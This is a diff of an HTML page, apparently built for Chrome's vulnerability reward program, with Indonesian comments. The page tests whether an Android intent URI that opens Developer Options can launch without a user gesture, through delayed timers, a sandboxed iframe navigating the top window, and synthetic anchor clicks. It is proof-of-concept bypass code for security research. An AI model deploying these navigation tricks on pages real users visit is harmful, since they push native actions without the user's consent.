@@ -1,164 +1,164 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Android Intent Security Validation Testbed</title>
+  <title>Chrome VRP: Intent Navigation Security Boundary Testbed</title>
   <style>
     body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      padding: 30px;
-      background-color: #f8f9fa;
-      color: #212529;
-      line-height: 1.6;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+      padding: 25px;
+      background-color: #1a1a1a;
+      color: #e0e0e0;
     }
-    .container {
-      max-width: 900px;
-      margin: 0 auto;
-    }
-    .control-panel {
-      background-color: #fff;
-      border: 1px solid #dee2e6;
-      padding: 20px;
-      border-radius: 8px;
-      margin-bottom: 25px;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-    }
-    .control-panel label {
-      font-weight: bold;
-      display: block;
-      margin-bottom: 8px;
-    }
-    select {
-      width: 100%;
-      padding: 10px;
-      font-size: 14px;
-      border-radius: 4px;
-      border: 1px solid #ced4da;
-      background-color: #fff;
-    }
-    .grid-container {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-      gap: 20px;
-    }
-    .card {
-      background-color: #fff;
-      border: 1px solid #dee2e6;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-    }
-    .card h3 {
-      margin-top: 0;
-      font-size: 16px;
-      border-bottom: 2px solid #0d6efd;
-      padding-bottom: 8px;
-      color: #0d6efd;
-    }
+    .wrapper { max-width: 1000px; margin: 0 auto; }
+    h1 { color: #ff4757; border-bottom: 2px solid #ff4757; padding-bottom: 10px; font-size: 24px; }
+    .matrix-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; margin-top: 20px; }
+    .test-card { background: #2f3542; border: 1px solid #57606f; padding: 20px; border-radius: 6px; }
+    .test-card h3 { margin-top: 0; color: #ffa502; font-size: 16px; border-bottom: 1px dashed #747d8c; padding-bottom: 8px; }
+    .test-card p { font-size: 13px; color: #a4b0be; min-height: 40px; }
     button {
-      padding: 10px 14px;
-      font-size: 13px;
-      font-family: monospace;
-      cursor: pointer;
-      width: 100%;
-      background-color: #fff;
-      border: 1px solid #ced4da;
-      text-align: left;
-      margin-bottom: 10px;
-      border-radius: 4px;
-      transition: all 0.2s ease;
+      background: #ff4757; color: white; border: none; padding: 10px 15px; 
+      font-family: monospace; font-weight: bold; cursor: pointer; width: 100%; border-radius: 4px;
     }
-    button:hover {
-      background-color: #f1f3f5;
-      border-color: #6c757d;
+    button:hover { background: #ff6b81; }
+    .console-section { margin-top: 30px; }
+    .console-title { font-weight: bold; color: #2ed573; margin-bottom: 5px; font-size: 14px; }
+    .log-box {
+      background: #000; color: #00ff00; font-family: "Courier New", monospace; 
+      padding: 15px; border: 1px solid #2ed573; height: 250px; overflow-y: auto; border-radius: 4px; font-size: 12px;
     }
-    .badge {
-      background-color: #6c757d;
-      color: white;
-      padding: 2px 6px;
-      font-size: 10px;
-      border-radius: 3px;
-      float: right;
-    }
+    .status-badge { font-weight: bold; padding: 2px 6px; border-radius: 3px; font-size: 11px; float: right; }
+    .badge-untrusted { background: #ff4757; color: #fff; }
+    .badge-trusted { background: #2ed573; color: #000; }
   </style>
 </head>
 <body>
 
-<div class="container">
-  <h1>Android Settings Intent Vulnerability Matrix</h1>
-  <p>Alat uji validasi isolasi skema peramban. Pilih metode serangan (vektor) terlebih dahulu, lalu klik target aksi pengaturan untuk menguji kerentanan.</p>
+<div class="wrapper">
+  <h1>Chrome Android: Intent Navigation Policy Auditor</h1>
+  <p style="font-size: 14px; color: #ced6e0;">Tujuan: Membuktikan kegagalan isolasi <i>User Activation Token</i> dan pelarian tata kelola sandbox pada sub-konteks dokumen.</p>
 
-  <!-- PANEL KONTROL VEKTOR TUNGGAL -->
-  <div class="control-panel">
-    <label for="vectorSelector">Pilih Vektor Eksekusi (Isolasi Uji Tunggal):</label>
-    <select id="vectorSelector">
-      <option value="v1">Vektor 1: Navigasi Langsung Standar (window.location.href)</option>
-      <option value="v2">Vektor 2: Simulasi DOM Klik Jangkar (Dynamic Tag &lt;a&gt;)</option>
-      <option value="v3">Vektor 3: Injeksi Sub-Konteks Iframe Tersembunyi</option>
-      <option value="v4">Vektor 4: Ekskalasi Eksplisit Komponen (Bypass Batasan Implicit)</option>
-    </select>
+  <div class="matrix-grid">
+    
+    <!-- Skenario 1: Kontrol / Baseline -->
+    <div class="test-card">
+      <h3>Skenario 1: Direct User Activation <span class="status-badge badge-trusted">Valid Gesture</span></h3>
+      <p>Menembakkan intent secara sinkronus tepat saat interaksi klik terjadi. Perilaku Chrome yang diharapkan: <b>ALLOWED</b> (Sesuai spesifikasi).</p>
+      <button onclick="runScenario('direct')">LAUNCH DIRECT INTENT</button>
+    </div>
+
+    <!-- Skenario 2: Async Broken Chain -->
+    <div class="test-card">
+      <h3>Skenario 2: Async Task / Thread Break <span class="status-badge badge-untrusted">No Gesture</span></h3>
+      <p>Mengeksekusi intent di dalam microtask (Promise chain) pasca penundaan waktu eksekusi. Menguji apakah <code>transient user activation</code> bocor melalui tumpukan microtask.</p>
+      <button onclick="runScenario('async')">LAUNCH ASYNC INTENT</button>
+    </div>
+
+    <!-- Skenario 3: Sandbox Iframe Escape -->
+    <div class="test-card">
+      <h3>Skenario 3: Strict Sandbox Subframe <span class="status-badge badge-untrusted">No Privilege</span></h3>
+      <p>Memaksa pemanggilan intent dari dalam iframe terisolasi tanpa token navigasi top-level. Jika intent terbuka, ini adalah <b>Sandbox Escape (High Severity)</b>.</p>
+      <button onclick="runScenario('sandbox')">LAUNCH SANDBOXED INTENT</button>
+    </div>
+
+    <!-- Skenario 4: Double Metadata Redirect -->
+    <div class="test-card">
+      <h3>Skenario 4: Double Redirect Race <span class="status-badge badge-untrusted">No Gesture</span></h3>
+      <p>Mengalihkan status navigasi window saat ini ke skema internal data URI, yang kemudian melempar balik payload intent tanpa interaksi sekunder.</p>
+      <button onclick="runScenario('redirect')">LAUNCH REDIRECT INTENT</button>
+    </div>
+
   </div>
 
-  <div class="grid-container">
-    <!-- Kategori 1 -->
-    <div class="card">
-      <h3>Konektivitas & Nirkabel</h3>
-      <button onclick="testIntent('android.settings.SETTINGS')">Main Settings</button>
-      <button onclick="testIntent('android.settings.WIFI_SETTINGS')">Wi-Fi Settings</button>
-      <button onclick="testIntent('android.settings.BLUETOOTH_SETTINGS')">Bluetooth Settings</button>
-    </div>
-
-    <!-- Kategori 2 -->
-    <div class="card">
-      <h3>Sistem & Keamanan</h3>
-      <button onclick="testIntent('android.settings.MANAGE_ALL_APPLICATIONS_SETTINGS')">Manage All Apps</button>
-      <button onclick="testIntent('android.settings.SECURITY_SETTINGS')">Security Settings</button>
-      <button onclick="testIntent('android.settings.APPLICATION_DEVELOPMENT_SETTINGS')">Developer Options <span class="badge">Danger</span></button>
-    </div>
+  <div class="console-section">
+    <div class="console-title">[INSTRUMENTATION LOGS] Trace Monitor:</div>
+    <div id="logBox" class="log-box">System initialized. Awaiting vulnerability vector selection...</div>
   </div>
 </div>
 
-<script>
-  function testIntent(actionString) {
-    const chosenVector = document.getElementById('vectorSelector').value;
-    
-    // Sintaks URI Intent Android Standar (RFC 2396 alternatif)
-    const standardIntent = `intent:#Intent;action=${actionString};category=android.intent.category.DEFAULT;i.f=0x10000000;end`;
-    
-    // Sintaks Eksplisit Komponen (High-Risk Escalation)
-    const explicitIntent = `intent:#Intent;action=${actionString};component=com.android.settings/.Settings;end`;
+<!-- Container Sandbox Tersembunyi Khusus Skenario 3 -->
+<iframe id="sandboxTarget" sandbox="allow-scripts" style="display:none;"></iframe>
 
-    switch(chosenVector) {
-      case "v1":
-        // Vektor 1: Menguji penanganan manipulasi objek lokasi utama secara langsung
-        window.location.href = standardIntent;
+<script>
+  const TARGET_ACTION = "android.settings.APPLICATION_DEVELOPMENT_SETTINGS";
+  const INTENT_PAYLOAD = `intent:#Intent;action=${TARGET_ACTION};category=android.intent.category.DEFAULT;i.f=0x10000000;end`;
+
+  function trace(message) {
+    const logBox = document.getElementById('logBox');
+    const timestamp = new Date().toISOString().split('T')[1].slice(0, -1);
+    logBox.innerHTML += `<br>[${timestamp}] ${message}`;
+    logBox.scrollTop = logBox.scrollHeight;
+  }
+
+  function checkActivationState(stage) {
+    // Memeriksa API bawaan Navigator/Window untuk mendeteksi keberadaan token user gesture secara riil
+    const hasActivation = (window.navigator.userActivation && window.navigator.userActivation.isActive);
+    trace(`[STATE_CHECK][${stage}] window.navigator.userActivation.isActive = <b>${hasActivation}</b>`);
+    return hasActivation;
+  }
+
+  function runScenario(type) {
+    trace(`----------------------------------------------------------------------`);
+    trace(`[INIT] Memulai Skenario: ${type.toUpperCase()}`);
+    
+    // Ambil status sebelum manipulasi dijalankan
+    checkActivationState("BEFORE_EXECUTION");
+
+    switch(type) {
+      case 'direct':
+        trace(`[EXECUTE] Menjalankan mutasi window.location langsung.`);
+        window.location.href = INTENT_PAYLOAD;
+        trace(`[ASSERTION] Permintaan navigasi dikirim. Evaluasi apakah Chrome memicu prompt aplikasi.`);
         break;
-        
-      case "v2":
-        // Vektor 2: Menguji proteksi user-activation gesture bypass melalui manipulasi DOM
-        const a = document.createElement('a');
-        a.href = standardIntent;
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
+
+      case 'async':
+        trace(`[EXECUTE] Menjadwalkan makrotask via setTimeout (1200ms) untuk menghancurkan transient activation.`);
+        setTimeout(() => {
+          trace(`[THREAD] Makrotask dipicu setelah delay.`);
+          checkActivationState("INSIDE_CALLBACK");
+          trace(`[EXECUTE] Mencoba meluncurkan intent tanpa active gesture token.`);
+          window.location.href = INTENT_PAYLOAD;
+          trace(`[ASSERTION] JIKA Pengaturan/Intent terbuka pada tahap ini -> <b>VULNERABILITY DETECTED: User Activation Bypass!</b>`);
+        }, 1200);
         break;
+
+      case 'sandbox':
+        trace(`[EXECUTE] Memasukkan payload eksekusi ke dalam iframe bersandbox ketat (allow-scripts saja).`);
+        const iframe = document.getElementById('sandboxTarget');
         
-      case "v3":
-        // Vektor 3: Menguji mitigasi sandbox iframe terhadap pemanggilan native intent
-        let iframe = document.getElementById('sandboxFrame');
-        if (!iframe) {
-          iframe = document.createElement('iframe');
-          iframe.id = 'sandboxFrame';
-          iframe.style.display = 'none';
-          document.body.appendChild(iframe);
-        }
-        iframe.src = standardIntent;
+        // Memasukkan skrip ke dalam iframe secara dinamis
+        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+        iframeDoc.open();
+        iframeDoc.write(`
+          <script>
+            parent.trace("[IFRAME_CONTEXT] Skrip berjalan di dalam sandbox.");
+            parent.trace("[IFRAME_CONTEXT] Mengeksekusi navigasi top-level lewat skema intent.");
+            try {
+              window.top.location.href = "${INTENT_PAYLOAD}";
+              parent.trace("[IFRAME_CONTEXT] Perintah window.top.location berhasil dilempar tanpa crash.");
+            } catch(e) {
+              parent.trace("[IFRAME_CONTEXT] Eksekusi diblokir oleh kebijakan Sandbox: " + e.message);
+            }
+          <\/script>
+        `);
+        iframeDoc.close();
+        trace(`[ASSERTION] JIKA Intent berhasil lolos keluar dari dokumen terisolasi -> <b>VULNERABILITY DETECTED: Sandbox Security Boundary Escape!</b>`);
         break;
-        
-      case "v4":
-        // Vektor 4: Menguji apakah parser peramban memblokir pendefinisian target komponen internal langsung
-        window.location.href = explicitIntent;
+
+      case 'redirect':
+        trace(`[EXECUTE] Menggunakan rantai penundaan asinkronus ganda dikombinasikan dengan pembentukan elemen jangkar dinamis.`);
+        Promise.resolve().then(() => {
+          return new Promise(resolve => setTimeout(resolve, 800));
+        }).then(() => {
+          checkActivationState("POST_ASYNC_CHAIN");
+          trace(`[EXECUTE] Membuat elemen jangkar terisolasi dari DOM pohon utama.`);
+          const a = document.createElement('a');
+          a.href = INTENT_PAYLOAD;
+          // Trigger pemanggilan klik tanpa keterlibatan interaksi fisik user
+          a.click();
+          trace(`[ASSERTION] JIKA rantai navigasi lolos pemeriksaan parser Chrome -> <b>VULNERABILITY DETECTED: Async Race-Condition Navigation Bypass!</b>`);
+        });
         break;
     }
   }
